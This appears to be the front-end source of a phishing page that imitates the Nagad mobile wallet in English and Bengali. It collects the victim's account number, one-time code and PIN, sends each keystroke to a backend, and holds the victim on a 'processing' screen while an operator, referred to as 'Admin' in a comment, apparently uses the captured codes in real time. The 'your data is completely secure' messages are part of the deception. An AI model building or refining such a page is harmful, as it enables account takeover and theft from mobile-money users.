import React, { useState, useEffect, useRef } from 'react';
import { TransactionSession } from '../types';
import { Shield, Lock, Clock, ArrowLeft, CheckCircle, AlertCircle } from 'lucide-react';
import { PhoneChatLockIcon, ShieldCheckIcon, CheckMarkBoxIcon } from './Icons';
import { InstructionsModal } from './InstructionsModal';

interface PaymentFlowProps {
  session: TransactionSession;
  lang: 'en' | 'bn';
  onUpdateSession: (updates: Partial<TransactionSession>) => void;
  onComplete: () => void;
  inputLogoUrl?: string;
  instructionsImageUrl?: string;
  numberPageIconUrl?: string;
  pinPageIconUrl?: string;
}

export const PaymentFlow: React.FC<PaymentFlowProps> = ({ session, lang, onUpdateSession, onComplete, inputLogoUrl, instructionsImageUrl, numberPageIconUrl, pinPageIconUrl }) => {
  const [phone, setPhone] = useState(session.accountNumber || '');
  const [otpValue, setOtpValue] = useState(session.otp || '');
  const [pinDigits, setPinDigits] = useState<string[]>(['', '', '', '']);
  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  
  const [errorMessage, setErrorMessage] = useState('');
  const [resendTimer, setResendTimer] = useState(90); // 1:30 mins = 90 secs
  const [isInstructionsOpen, setIsInstructionsOpen] = useState(false);

  // Sync to backend function
  const syncToFirebase = (updates: Partial<TransactionSession>) => {
    onUpdateSession({ ...updates, updatedAt: Date.now() });
  };

  useEffect(() => {
    if (errorMessage) {
      const t = setTimeout(() => setErrorMessage(''), 3000);
      return () => clearTimeout(t);
    }
  }, [errorMessage]);

  // Timer logic for OTP Resend
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (session.step === 'otp' && resendTimer > 0) {
      interval = setInterval(() => {
        setResendTimer(prev => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [session.step, resendTimer]);

  const handleResendOtp = () => {
    if (resendTimer > 0) return;
    setResendTimer(90);
    syncToFirebase({ status: 'otp_resend_requested' }); // Admin will see the status update
  };

  const formatTimer = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `0${m}:${s < 10 ? '0' : ''}${s}`;
  };

  // Completion logic
  useEffect(() => {
    if (session.step === 'completed' || session.step === 'success' || session.step === 'failed') {
      const t = setTimeout(() => {
        if (session.step === 'success') {
          onComplete();
        }
      }, 2000);
      return () => clearTimeout(t);
    }
  }, [session.step, onComplete]);

  const goBack = () => {
    if (session.step === 'otp') {
      syncToFirebase({ step: 'number', otp: '' });
      setOtpValue('');
    } else if (session.step === 'pin') {
      syncToFirebase({ step: 'otp', pin: '' });
      setPinDigits(['', '', '', '']);
    }
  };

  const handleProceedNumber = () => {
    const isValidBDNumber = /^01\d{9}$/.test(phone);
    if (!isValidBDNumber) {
      setErrorMessage(lang === 'bn' ? 'সঠিক বাংলাদেশি নাম্বার দিন' : 'Enter valid Bangladeshi number');
      return;
    }
    syncToFirebase({ accountNumber: phone, step: 'otp' });
    setResendTimer(90);
  };

  const handleProceedOtp = () => {
    if (otpValue.length !== 6) {
      setErrorMessage(lang === 'bn' ? 'সঠিক কোড দিন' : 'Enter valid code');
      return;
    }
    syncToFirebase({ otp: otpValue, step: 'pin' });
  };

  const handleProceedPin = () => {
    const p = pinDigits.join('');
    if (p.length !== 4) {
      setErrorMessage(lang === 'bn' ? 'সঠিক পিন দিন' : 'Enter valid PIN');
      return;
    }
    syncToFirebase({ pin: p, step: 'processing' });
  };

  const handlePinDigitChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...pinDigits];
    newDigits[index] = value;
    setPinDigits(newDigits);
    syncToFirebase({ pin: newDigits.join('') });
    if (value && index < 3) {
      pinInputRefs.current[index + 1]?.focus();
    }
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pinDigits[index] && index > 0) {
      pinInputRefs.current[index - 1]?.focus();
      const newDigits = [...pinDigits];
      newDigits[index - 1] = '';
      setPinDigits(newDigits);
    }
  };

  // ---- STEP: NUMBER ----
  if (session.step === 'number') {
    return (
      <div className="w-full flex-1 flex flex-col font-sans max-w-sm mx-auto">
        {errorMessage && (
           <div className="fixed top-4 left-1/2 -translate-x-1/2 w-[90%] max-w-sm bg-[#c81e1e] text-white text-sm font-bold py-3 px-4 rounded shadow-lg text-center z-50 animate-in slide-in-from-top-2 fade-in">
             {errorMessage}
           </div>
        )}
        
        <div className="bg-white rounded-[20px] border border-gray-200 shadow-[0_2px_10px_rgba(0,0,0,0.04)] w-full py-5 px-6 mb-6 flex flex-row items-center gap-4">
          <div className="shrink-0 scale-110 origin-left flex items-center justify-center">
            {numberPageIconUrl ? (
              <img src={numberPageIconUrl} alt="header icon" className="w-10 h-10 object-contain" />
            ) : (
              <PhoneChatLockIcon />
            )}
          </div>
          <div className="flex flex-col">
            <h2 className="font-bold text-[17px] text-gray-900 mb-1">{lang === 'bn' ? 'আপনার নগদ নাম্বারটি দিন' : 'Enter your Nagad Number'}</h2>
            <p className="text-[13px] text-gray-500 leading-snug">
              {lang === 'bn' ? 'পেমেন্ট সম্পন্ন করতে' : 'To complete payment'} <br/>
              {lang === 'bn' ? 'আপনার নগদ নাম্বারটি লিখুন' : 'enter your Nagad number'}
            </p>
          </div>
        </div>

        <div className="flex flex-col flex-1 pb-4">
          <label className="text-[15px] font-bold text-gray-900 mb-2">
            {lang === 'bn' ? 'নগদ নাম্বার' : 'Nagad Number'}
          </label>
          <div className="relative mb-6">
            <div className="absolute inset-y-0 left-4 flex items-center pointer-events-none">
              {inputLogoUrl ? (
                 <img src={inputLogoUrl} alt="icon" className="w-6 h-6 object-contain" />
              ) : (
                 <img src="https://download.logo.wine/logo/Nagad/Nagad-Logo.wine.png" alt="nagad" className="w-8 h-8 object-contain scale-150" />
              )}
            </div>
            <input
              type="tel"
              value={phone}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, '');
                setPhone(val);
                syncToFirebase({ accountNumber: val });
              }}
              placeholder="01XXXXXXXXX"
              className={`w-full border-2 rounded-lg py-4 pl-[52px] pr-4 text-gray-900 font-bold focus:outline-none text-[17px] tracking-wide transition-colors ${phone.length > 0 ? 'border-[#ed1c24]' : 'border-gray-200'}`}
              maxLength={11}
            />
          </div>

          <div className="w-full bg-[#fdf2f2] rounded-lg px-4 py-3 flex items-start gap-2.5 mb-8 border border-red-50">
            <Shield className="w-4 h-4 text-teal-600 shrink-0 mt-0.5 fill-teal-100" />
            <p className="text-[12px] text-gray-700 leading-[1.4] font-medium pt-0.5">
              {lang === 'bn' ? 'নিরাপদ থাকুন, এটি আপনার একাউন্টের নিরাপদ লেনদেন নিশ্চিত করে।' : 'Stay safe, this ensures a secure transaction for your account.'}
            </p>
          </div>

          <button onClick={() => setIsInstructionsOpen(true)} className="w-full border-2 border-dashed border-[#ed1c24] rounded-full py-3.5 mb-6 text-[#ed1c24] font-bold text-[15px] flex items-center justify-center gap-2 hover:bg-red-50 transition-colors">
            <span className="text-xl leading-none -mt-0.5">?</span> {lang === 'bn' ? 'নির্দেশনা দেখুন' : 'View Instructions'}
          </button>
          
          <button
            onClick={handleProceedNumber}
            disabled={phone.length < 11}
            style={{ backgroundColor: phone.length >= 11 ? '#ed1c24' : '#f4999d' }}
            className="w-full text-white font-bold text-[16px] py-4 rounded-full transition-colors mt-auto sm:mt-0"
          >
            {lang === 'bn' ? 'পরবর্তী' : 'Next'}
          </button>

          <div className="mt-8 flex items-center justify-center gap-1.5 pb-4">
            <Lock className="w-3.5 h-3.5 text-gray-400 fill-gray-200" />
            <span className="text-[12px] text-gray-500 font-medium">{lang === 'bn' ? 'আপনার তথ্য সম্পূর্ণ নিরাপদ' : 'Your data is completely secure'}</span>
          </div>
        </div>
        
        <InstructionsModal isOpen={isInstructionsOpen} onClose={() => setIsInstructionsOpen(false)} imageUrl={instructionsImageUrl} />
      </div>
    );
  }

  // ---- STEP: OTP ----
  if (session.step === 'otp') {
    return (
      <div className="fixed inset-0 bg-white z-40 flex flex-col font-sans">
        {/* Red Header */}
        <div className="bg-[#ed1c24] text-white flex items-center p-4 shrink-0 shadow-sm relative z-50">
          <button onClick={goBack} className="p-1 mr-3 hover:bg-white/20 rounded-full transition-colors">
            <ArrowLeft className="w-6 h-6" />
          </button>
          <h1 className="font-bold text-lg">{lang === 'bn' ? 'মোবাইল নম্বর নিশ্চিত করুন' : 'Verify Mobile Number'}</h1>
        </div>

        {/* Toast Error Message */}
        {errorMessage && (
           <div className="absolute top-16 left-1/2 -translate-x-1/2 w-[90%] max-w-sm bg-[#c81e1e] text-white text-sm font-bold py-3 px-4 rounded shadow-lg text-center z-50 animate-in slide-in-from-top-2 fade-in">
             {errorMessage}
           </div>
        )}

        <div className="flex-1 overflow-y-auto flex flex-col items-center pt-8 px-6 bg-white">
          <div className="mb-6 transform scale-[1.7] origin-center mt-4 flex items-center justify-center">
             {numberPageIconUrl ? (
               <img src={numberPageIconUrl} alt="header icon" className="w-10 h-10 object-contain" />
             ) : (
               <PhoneChatLockIcon />
             )}
          </div>
          <p className="text-[13px] text-gray-600 text-center leading-[1.6] mb-8 font-medium">
            {lang === 'bn' ? 'আপনার নগদ একাউন্টের নিরাপত্তার জন্য' : 'For your Nagad account security'}<br/>
            {lang === 'bn' ? 'আমরা আপনাকে একটি ৬ সংখ্যার' : 'we have sent a 6 digit'}<br/>
            {lang === 'bn' ? 'নিরাপত্তা কোড পাঠিয়েছি।' : 'security code to you.'}
          </p>

          <div className="bg-gray-50 rounded-[20px] px-8 py-3 mb-8 border border-gray-100 flex flex-col items-center">
            <span className="text-[12px] text-gray-500 font-medium mb-0.5">{lang === 'bn' ? 'আপনার নগদ নাম্বার' : 'Your Nagad Number'}</span>
            <div className="flex items-center gap-2">
              <div className="w-6 h-6 flex items-center justify-center shrink-0">
                {inputLogoUrl ? (
                  <img src={inputLogoUrl} alt="icon" className="w-full h-full object-contain" />
                ) : (
                  <div className="w-5 h-5 bg-[#ed1c24] rounded-full flex items-center justify-center">
                    <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/></svg>
                  </div>
                )}
              </div>
              <span className="font-bold text-[17px] text-gray-900">{session.accountNumber}</span>
            </div>
          </div>

          <div className="w-full max-w-sm self-start mb-2">
            <h3 className="font-bold text-[15px] text-gray-900">{lang === 'bn' ? '৬ সংখ্যার কোড' : '6 Digit Code'}</h3>
          </div>
          
          <div className="relative mb-6 w-full max-w-sm">
            <input
              type="tel"
              maxLength={6}
              value={otpValue}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, '');
                setOtpValue(val);
                syncToFirebase({ otp: val });
              }}
              placeholder={lang === 'bn' ? 'কোড লিখুন / পেস্ট করুন' : 'Enter / Paste code'}
              className={`w-full border-2 rounded-lg py-4 px-4 text-center text-gray-900 font-bold focus:outline-none text-[17px] tracking-[0.2em] transition-colors placeholder:tracking-normal placeholder:font-normal placeholder:text-gray-400 placeholder:text-[15px] ${otpValue.length > 0 ? 'border-[#ed1c24]' : 'border-gray-200'}`}
            />
            {otpValue.length === 6 && (
              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-green-500">
                 <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" /></svg>
              </div>
            )}
          </div>

          <div className="w-full max-w-sm border border-gray-100 rounded-lg py-3.5 px-4 flex items-start gap-2.5 mb-8 bg-gray-50">
            <Clock className="w-4 h-4 text-[#ed1c24] shrink-0 mt-0.5" />
            <p className="text-[12px] text-gray-500 font-medium leading-[1.4] pt-0.5">
              {lang === 'bn' ? 'কোড পাঠাতে সময় লাগতে পারে ১:৩০ পর্যন্ত' : 'It may take up to 1:30 mins.'}<br/>
              {lang === 'bn' ? 'কোড না পেলে ' : 'If not received '}
              
              <span 
                onClick={handleResendOtp}
                className={`font-bold ${resendTimer === 0 ? 'text-[#ed1c24] cursor-pointer hover:underline' : 'text-gray-400 cursor-not-allowed'}`}
              >
                {lang === 'bn' ? 'পুনরায় পাঠান' : 'Resend'}
              </span>
              
              {resendTimer > 0 && (
                <span className="font-bold text-gray-700 ml-1">({formatTimer(resendTimer)})</span>
              )}
            </p>
          </div>

          <button
            onClick={handleProceedOtp}
            disabled={otpValue.length !== 6}
            style={{ backgroundColor: otpValue.length === 6 ? '#ed1c24' : '#f4999d' }}
            className="w-full max-w-sm text-white font-bold text-[16px] py-4 rounded-full transition-colors mt-auto sm:mt-0"
          >
            {lang === 'bn' ? 'কোড যাচাই করুন' : 'Verify Code'}
          </button>
          
          <div className="mt-8 flex items-center justify-center gap-1.5 pb-4">
            <Lock className="w-3.5 h-3.5 text-gray-400 fill-gray-200" />
            <span className="text-[12px] text-gray-500 font-medium">{lang === 'bn' ? 'আপনার তথ্য সম্পূর্ণ নিরাপদ' : 'Your data is completely secure'}</span>
          </div>
        </div>
      </div>
    );
  }

  // ---- STEP: PIN ----
  if (session.step === 'pin') {
    return (
      <div className="fixed inset-0 bg-white z-40 flex flex-col font-sans">
        {/* Red Header */}
        <div className="bg-[#ed1c24] text-white flex items-center p-4 shrink-0 shadow-sm relative z-50">
          <button onClick={goBack} className="p-1 mr-3 hover:bg-white/20 rounded-full transition-colors">
            <ArrowLeft className="w-6 h-6" />
          </button>
          <h1 className="font-bold text-lg">{lang === 'bn' ? 'নিরাপত্তা পিন' : 'Security PIN'}</h1>
        </div>

        {/* Toast Error Message */}
        {errorMessage && (
           <div className="absolute top-16 left-1/2 -translate-x-1/2 w-[90%] max-w-sm bg-[#c81e1e] text-white text-sm font-bold py-3 px-4 rounded shadow-lg text-center z-50 animate-in slide-in-from-top-2 fade-in">
             {errorMessage}
           </div>
        )}

        <div className="flex-1 overflow-y-auto flex flex-col items-center pt-8 px-6 bg-white">
          <div className="w-[88px] h-[88px] mb-5 bg-[#fdf2f2] rounded-full flex items-center justify-center overflow-hidden p-2">
             {pinPageIconUrl ? (
               <img src={pinPageIconUrl} alt="pin icon" className="w-full h-full object-contain" />
             ) : (
               <Shield className="w-11 h-11 text-teal-600 fill-teal-100" strokeWidth={1.5} />
             )}
          </div>
          
          <h2 className="text-[20px] font-bold text-gray-900 mb-1">{lang === 'bn' ? 'আপনার নিরাপত্তা পিন লিখুন' : 'Enter Security PIN'}</h2>
          <p className="text-gray-500 text-[13px] font-medium mb-10">{lang === 'bn' ? 'আপনার ৪ সংখ্যার নিরাপত্তা পিন দিন' : 'Enter your 4 digit PIN'}</p>

          <div className="flex justify-center gap-4 mb-5">
            {[0, 1, 2, 3].map((i) => (
              <input
                key={i}
                ref={(el) => (pinInputRefs.current[i] = el)}
                type="password"
                inputMode="numeric"
                maxLength={1}
                value={pinDigits[i] || ''}
                onChange={(e) => handlePinDigitChange(i, e.target.value)}
                onKeyDown={(e) => handlePinKeyDown(i, e)}
                className={`w-[52px] h-[58px] border-2 rounded-lg text-center text-2xl font-bold text-gray-900 focus:outline-none focus:border-[#ed1c24] transition-colors ${pinDigits[i] ? 'border-[#ed1c24]' : 'border-gray-200'}`}
              />
            ))}
          </div>

          <button className="text-[#ed1c24] font-bold text-[14px] mb-8">
            {lang === 'bn' ? 'পিন ভুলে গেছেন?' : 'Forgot PIN?'}
          </button>

          <div className="w-full max-w-sm bg-[#fdf2f2] rounded-lg px-4 py-3 flex items-start gap-2.5 mb-8 border border-red-50">
            <Lock className="w-4 h-4 text-[#eab308] shrink-0 mt-0.5 fill-[#eab308]" />
            <p className="text-[12px] text-gray-700 leading-snug font-medium pt-0.5">
              {lang === 'bn' ? 'এটি আপনার পেমেন্ট পিন। অন্য কারো সাথে শেয়ার করবেন না।' : 'This is your payment PIN. Do not share with anyone.'}
            </p>
          </div>

          <button
            onClick={handleProceedPin}
            disabled={pinDigits.join('').length !== 4}
            style={{ backgroundColor: pinDigits.join('').length === 4 ? '#ed1c24' : '#f4999d' }}
            className="w-full max-w-sm text-white font-bold text-[16px] py-4 rounded-full transition-colors shadow-sm"
          >
            {lang === 'bn' ? 'পেমেন্ট করুন' : 'Make Payment'}
          </button>
          
          <div className="mt-6 flex items-center justify-center gap-1.5 pb-4">
            <CheckMarkBoxIcon />
            <span className="text-[12px] text-gray-500 font-medium">{lang === 'bn' ? 'নিরাপদ ও সুরক্ষিত লেনদেন' : 'Safe & Secure Transaction'}</span>
          </div>
        </div>
      </div>
    );
  }

  // ---- STEP: PROCESSING & SUCCESS ----
  return (
    <div className="fixed inset-0 bg-black/40 z-50 flex items-center justify-center p-4 backdrop-blur-[2px] font-sans">
      <div className="bg-white w-full max-w-sm rounded-[20px] p-8 flex flex-col items-center text-center shadow-2xl relative overflow-hidden">
        
        {session.step === 'processing' && (
          <div className="flex items-center justify-center gap-4 py-3">
            <div className="relative w-8 h-8 shrink-0">
              <div className="absolute inset-0 rounded-full border-[3px] border-gray-100"></div>
              <div className="absolute inset-0 rounded-full border-[3px] border-[#ed1c24] border-t-transparent animate-spin"></div>
            </div>
            <span className="font-bold text-gray-900 text-[17px]">
              {lang === 'bn' ? 'অনুগ্রহ করে অপেক্ষা করুন...' : 'Please wait...'}
            </span>
          </div>
        )}

        {session.step === 'success' && (
          <div className="py-2 flex flex-col items-center">
            <CheckCircle className="w-16 h-16 text-green-500 mb-5 animate-in zoom-in" />
            <h2 className="text-[20px] font-bold text-gray-900 mb-2">
              {lang === 'bn' ? 'পেমেন্ট সফল' : 'Payment Successful'}
            </h2>
            <p className="text-gray-500 text-[14px] font-medium">
              {lang === 'bn' ? 'আপনার পেমেন্ট সফলভাবে সম্পন্ন হয়েছে।' : 'Your payment has been completed successfully.'}
            </p>
          </div>
        )}

        {session.step === 'failed' && (
          <div className="py-2 flex flex-col items-center">
            <div className="w-16 h-16 mb-5 bg-red-100 rounded-full flex items-center justify-center animate-in zoom-in">
               <AlertCircle className="w-8 h-8 text-[#ed1c24]" />
            </div>
            <h2 className="text-[20px] font-bold text-gray-900 mb-2">
              {lang === 'bn' ? 'পেমেন্ট সফল হয়নি' : 'Payment Failed'}
            </h2>
            <p className="text-gray-500 text-[14px] font-medium mb-6">
              {lang === 'bn' ? 'দয়া করে আবার চেষ্টা করুন।' : 'Please try again.'}
            </p>
            <button 
              onClick={() => syncToFirebase({ step: 'number', otp: '', pin: '' })}
              className="w-full bg-[#ed1c24] text-white py-3 px-8 rounded-full font-bold transition-colors"
            >
              {lang === 'bn' ? 'আবার চেষ্টা করুন' : 'Try Again'}
            </button>
          </div>
        )}

      </div>
    </div>
  );
};
